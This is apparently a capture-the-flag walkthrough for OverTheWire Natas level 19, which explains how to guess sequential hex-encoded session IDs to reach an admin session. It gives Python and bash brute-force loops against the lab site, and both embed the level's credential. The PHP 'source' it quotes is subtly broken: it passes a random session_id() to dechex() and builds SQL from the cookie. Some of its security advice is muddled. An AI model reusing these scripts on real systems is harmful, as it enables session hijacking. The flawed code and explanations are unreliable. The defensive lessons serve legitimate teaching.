19 Session ID Encoding — Hex Encoding Hard

// Key Concepts

Session ID Encoding Hex Encoding Session ID Prediction Brute Force Authentication Bypass

// Challenge Overview

This level is similar to Level 18 but now the session ID is encoded in hexadecimal. The ID is still predictable — we just need to convert between hex and decimal.

// Initial Analysis

View the source code:

<?php $maxid = 640; if (isset($_COOKIE["PHPSESSID"])) { $sessionid = hexdec($_COOKIE["PHPSESSID"]); } else { session_start(); $sessionid = session_id(); setcookie("PHPSESSID", dechex($sessionid)); } if ($sessionid >= 1 && $sessionid <= $maxid) { $user = "SELECT * FROM users WHERE id = " . $sessionid; $result = mysql_query($user); if (mysql_num_rows($result) > 0) { $row = mysql_fetch_assoc($result); if ($row['username'] == 'admin') { print "Password: ..."; } } } ?>

The session ID is converted to hexadecimal before being stored in the cookie. We need to convert the hex value back to decimal to find the admin ID.

💡 Hex encoding is not encryption — it's just a different representation of the same number. Converting between hex and decimal is trivial.

// Solution Walkthrough

Step 1 — Understanding the encoding:

# Decimal 1 → Hex 1 → Cookie value "1" # Decimal 10 → Hex a → Cookie value "a" # Decimal 16 → Hex 10 → Cookie value "10" # Decimal 100 → Hex 64 → Cookie value "64"

Step 2 — Brute force with hex encoding:

import requests url = "http://natas19.natas.labs.overthewire.org/" auth = ("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs") for i in range(1, 641): # Convert to hex (remove '0x' prefix if present) hex_id = hex(i)[2:] cookies = {"PHPSESSID": hex_id} response = requests.get(url, auth=auth, cookies=cookies) if "Password" in response.text: print(f"Found admin session ID: {i} (hex: {hex_id})") print(response.text) break

Step 3 — Using curl with hex encoding:

# For each ID 1-640, convert to hex and test for i in {1..640}; do hex=$(printf '%x' $i) curl -u natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs \ --cookie "PHPSESSID=$hex" \ http://natas19.natas.labs.overthewire.org/ | grep -q "Password" && echo "Found: $i ($hex)" done

Step 4 — Manual testing:

Try some common admin IDs in hex:

# ID 119 → hex 77 http://natas19.natas.labs.overthewire.org/ # PHPSESSID=77 # ID 120 → hex 78 http://natas19.natas.labs.overthewire.org/ # PHPSESSID=78

// Why It Works

The session management is still vulnerable because:

  • Hex encoding is not security: It's just a different representation.
  • Predictable IDs: The underlying IDs are still sequential.
  • Small range: Only 640 possible values.
  • No authentication: The session ID is still directly used in a SQL query.

// Hex Encoding vs Encryption

Feature Hex Encoding Encryption
PurposeData representationData confidentiality
ReversibleYes (easily)Yes (with key)

Key requiredNoYes

// Defensive Measures

  • Use cryptographically random session IDs with high entropy.
  • Use PHP's built-in session management with proper configuration.
  • Do not encode or hash session IDs — use them directly.
  • Store session data on the server and validate it on each request.
  • Implement rate limiting to prevent brute force.

// Key Takeaways

🔢 Encoding ≠ Security

Hex encoding is just a different way to write numbers. It provides no security and should not be used for session protection.

🔑 Use Random Session IDs

Session IDs must be cryptographically random. Sequential IDs, even when encoded, are still predictable.
